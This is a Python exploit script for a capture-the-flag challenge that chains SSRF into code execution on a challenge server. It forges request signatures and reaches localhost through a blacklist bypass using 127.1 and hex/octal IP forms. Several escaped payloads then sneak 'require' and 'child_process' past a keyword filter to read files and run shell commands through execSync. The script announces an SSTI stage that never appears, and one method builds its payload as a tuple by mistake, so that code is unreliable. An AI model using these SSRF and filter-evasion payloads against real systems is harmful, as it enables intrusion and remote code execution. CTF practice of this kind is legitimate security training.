#!/usr/bin/env python3
"""
MEDUSA 2.0 Challenge: Cascade - Exploit Script
Demonstrates the complete exploitation chain: SSTI â†’ SSRF â†’ Deserialization
"""

import requests
import json
import base64
import sys
from typing import Dict, Any

# Configuration
BASE_URL = "https://cascade-ctf.onrender.com"
INTERNAL_URL = "http://localhost:3001"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.CYAN}{'='*60}
   MEDUSA 2.0 - Cascade Challenge Exploit
   Chaining: SSTI â†’ SSRF â†’ Insecure Deserialization
{'='*60}{Colors.END}
    """
    print(banner)

def print_status(msg: str, status: str = "info"):
    icons = {
        "info": f"{Colors.BLUE}[*]{Colors.END}",
        "success": f"{Colors.GREEN}[+]{Colors.END}",
        "error": f"{Colors.RED}[-]{Colors.END}",
        "flag": f"{Colors.YELLOW}[!]{Colors.END}"
    }
    print(f"{icons.get(status, icons['info'])} {msg}")

def check_health() -> bool:
    """Check if the challenge server is running"""
    try:
        print_status("Checking server health...", "info")
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print_status("Server is online!", "success")
            return True
        return False
    except requests.exceptions.RequestException as e:
        print_status(f"Server is offline: {e}", "error")
        return False

def exploit_ssrf(url: str) -> Dict[str, Any]:
    """Exploit SSRF vulnerability to access internal service"""
    print_status(f"Exploiting SSRF to access: {url}", "info")
    try:
        # Calculate MD5 signature for SSRF bypass
        import hashlib
        signature = hashlib.md5((url + 'secret123').encode()).hexdigest()[:8]
        
        response = requests.get(f"{BASE_URL}/fetch", params={"url": url, "sig": signature}, timeout=5)
        if response.status_code == 200:
            print_status("SSRF successful! Internal service accessed.", "success")
            return response.json()
        else:
            print_status(f"SSRF failed with status {response.status_code}", "error")
            return {}
    except requests.exceptions.RequestException as e:
        print_status(f"SSRF error: {e}", "error")
        return {}

def get_eval_token() -> str:
    """Get eval token from internal service via SSRF"""
    print_status("Step 1: Generating auth token for internal service...", "info")
    
    import time
    import hashlib
    
    # Generate timestamp and token
    timestamp = str(int(time.time()))
    token_string = f"internal_{timestamp}_cascade"
    auth_token = hashlib.sha256(token_string.encode()).hexdigest()[:16]
    
    # Use IP encoding to bypass localhost blacklist
    # 127.1 is shorthand for 127.0.0.1 (omitted octets default to 0)
    # Alternative bypasses: 0x7f000001 (hex), 2130706433 (decimal), 0177.0.0.1 (octal)
    internal_url = f"http://127.1:3001/token?ts={timestamp}&token={auth_token}"
    print_status("Step 2: Exploiting SSRF to access internal /token endpoint...", "info")
    print_status(f"Using IP bypass: 127.1 (shorthand for 127.0.0.1)", "info")
    
    token_data = exploit_ssrf(internal_url)
    
    if token_data and "evalToken" in token_data:
        print_status(f"Eval token obtained: {token_data['evalToken'][:30]}...", "success")
        return token_data["evalToken"]
    
    print_status("Failed to obtain eval token", "error")
    return None

def exploit_eval_bypass(payload: str, eval_token: str = None) -> str:
    """Exploit insecure deserialization with blacklist bypass"""
    print_status("Step 3: Exploiting eval endpoint with blacklist bypass...", "info")
    
    if not eval_token:
        print_status("No eval token provided - attempting to get one...", "info")
        eval_token = get_eval_token()
        if not eval_token:
            print_status("Cannot proceed without eval token", "error")
            return ""
    
    try:
        headers = {"Content-Type": "application/json"}
        data = json.dumps({"code": payload, "token": eval_token})
        response = requests.post(f"{BASE_URL}/eval", headers=headers, data=data, timeout=5)
        
        if response.status_code == 200:
            result = response.json()
            if "result" in result:
                print_status("Eval bypass successful!", "success")
                return result["result"]
            elif "error" in result:
                print_status(f"Eval blocked: {result['error']}", "error")
                return ""
        else:
            print_status(f"Eval failed with status {response.status_code}", "error")
            if response.status_code == 401:
                print_status("Hint: You need a valid token from internal service", "error")
            return ""
    except requests.exceptions.RequestException as e:
        print_status(f"Eval error: {e}", "error")
        return ""

def exploit_method_1_string_concat(eval_token: str = None):
    """Method 1: Full exploitation chain - SSRF -> Token -> Eval bypass"""
    print_status("\n=== Method 1: Complete Chain (SSRF -> Token -> Eval) ===", "info")
    
    # Get eval token via SSRF first
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Bypass 'require' keyword using hex escapes
    # fs and module are NOT blocked, only require/process/child_process
    payload = r'module["\x72\x65\x71\x75\x69\x72\x65"]("fs").readFileSync("/tmp/flag.txt","utf8")'
    result = exploit_eval_bypass(payload, eval_token)
    
    if result and "MEDUSA2{" in result:
        print_status(f"FLAG FOUND: {result}", "flag")
        return result
    return None

def exploit_method_2_constructor(eval_token: str = None):
    """Method 2: Unicode escape bypass"""
    print_status("\n=== Method 2: Unicode Escape Bypass ===", "info")
    
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Use Unicode escapes instead of hex
    payload = r'module["\u0072\u0065\u0071\u0075\u0069\u0072\u0065"]("fs").readFileSync("/tmp/flag.txt","utf8")'
    result = exploit_eval_bypass(payload, eval_token)
    
    if result and "MEDUSA2{" in result:
        print_status(f"FLAG FOUND: {result}", "flag")
        return result
    return None

def exploit_method_3_globalthis(eval_token: str = None):
    """Method 3: Octal escape bypass"""
    print_status("\n=== Method 3: Octal Escape Bypass ===", "info")
    
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Use octal escapes
    payload = r'module["\162\145\161\165\151\162\145"]("fs").readFileSync("/tmp/flag.txt","utf8")'
    result = exploit_eval_bypass(payload, eval_token)
    
    if result and "MEDUSA2{" in result:
        print_status(f"FLAG FOUND: {result}", "flag")
        return result
    return None

def exploit_method_4_computed_property(eval_token: str = None):
    """Method 4: Using child_process with hex escape"""
    print_status("\n=== Method 4: Child Process Bypass ===", "info")
    
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Use child_process with escapes to execute shell command
    payload = r'module["\x72\x65\x71\x75\x69\x72\x65"]("child_\x70rocess").execSync("cat /tmp/flag.txt").toString()'
    result = exploit_eval_bypass(payload, eval_token)
    
    if result and "MEDUSA2{" in result:
        print_status(f"FLAG FOUND: {result}", "flag")
        return result
    return None

def exploit_method_5_internal_gadget(eval_token: str = None):
    """Method 5: Use gadget from internal service"""
    print_status("\n=== Method 5: Internal Service Gadget ===", "info")
    
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Step 1: Access internal service via SSRF
    print_status("Fetching malicious gadget from internal service...", "info")
    internal_data = exploit_ssrf(f"{INTERNAL_URL}/data")
    
    if not internal_data or "data" not in internal_data:
        print_status("Failed to retrieve gadget from internal service", "error")
        return None
    
    # Parse the JSON response
    try:
        gadget_json = json.loads(internal_data["data"])
        if "code" not in gadget_json:
            print_status("No code found in gadget", "error")
            return None
        
        code_payload = gadget_json["code"]
        print_status(f"Gadget code: {code_payload}", "success")
        
        # The code is: fs.readFileSync("/tmp/flag.txt", "utf8")
        # We need to make 'fs' available by requiring it first
        # Use hex escape to bypass 'require' blacklist
        bypass_payload = f'(function(){{const fs = module["\\x72\\x65\\x71\\x75\\x69\\x72\\x65"]("fs"); return {code_payload}}})()', eval_token
        
        result = exploit_eval_bypass(bypass_payload, eval_token)
        
        if result and "MEDUSA2{" in result:
            print_status(f"FLAG FOUND: {result}", "flag")
            return result
    except Exception as e:
        print_status(f"Failed to process gadget: {e}", "error")
    
    return None

def exploit_method_6_indirect_eval(eval_token: str = None):
    """Method 6: Alternative encoding methods"""
    print_status("\n=== Method 6: Alternative Encodings ===", "info")
    
    if not eval_token:
        eval_token = get_eval_token()
        if not eval_token:
            return None
    
    # Try various encoding techniques
    payloads = [
        # Method 1: String concatenation with module
        r'module["req" + "uire"]("fs").readFileSync("/tmp/flag.txt","utf8")',
        
        # Method 2: Bracket notation split
        r'module["req"]["constructor"]("return module[\u0022req\u0075ire\u0022](\u0022fs\u0022).readFileSync(\u0022/tmp/flag.txt\u0022,\u0022utf8\u0022))()',
        
        # Method 3: Template literals
        'module[`req${""}uire`]("fs").readFileSync("/tmp/flag.txt","utf8")',
    ]
    
    for i, payload in enumerate(payloads, 1):
        print_status(f"Trying alternative encoding {i}...", "info")
        result = exploit_eval_bypass(payload, eval_token)
        if result and "MEDUSA2{" in result:
            print_status(f"FLAG FOUND: {result}", "flag")
            return result
    
    return None

def main():
    print_banner()
    
    # Check if server is running
    if not check_health():
        print_status("Please start the challenge server first!", "error")
        print_status("Run: docker-compose up -d", "info")
        sys.exit(1)
    
    # Test SSRF vulnerability first
    print_status("\n=== Testing SSRF Vulnerability ===", "info")
    internal_health = exploit_ssrf(f"{INTERNAL_URL}/health")
    if internal_health:
        print_status(f"Internal service response: {internal_health}", "success")
    
    # Try different exploitation methods
    methods = [
        exploit_method_1_string_concat,
        exploit_method_2_constructor,
        exploit_method_3_globalthis,
        exploit_method_4_computed_property,
        exploit_method_6_indirect_eval,
        exploit_method_5_internal_gadget,
    ]
    
    flag = None
    for method in methods:
        try:
            flag = method()
            if flag:
                break
        except Exception as e:
            print_status(f"Method failed: {e}", "error")
            continue
    
    # Final result
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    if flag:
        print_status(f"{Colors.BOLD}EXPLOITATION SUCCESSFUL!{Colors.END}", "flag")
        print(f"{Colors.YELLOW}{Colors.BOLD}\nFLAG: {flag}{Colors.END}\n")
        print_status("Challenge completed! ðŸŽ‰", "success")
    else:
        print_status("Exploitation failed. All methods exhausted.", "error")
        print_status("Check if the server is running and try again.", "info")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")

if __name__ == "__main__":
    main()
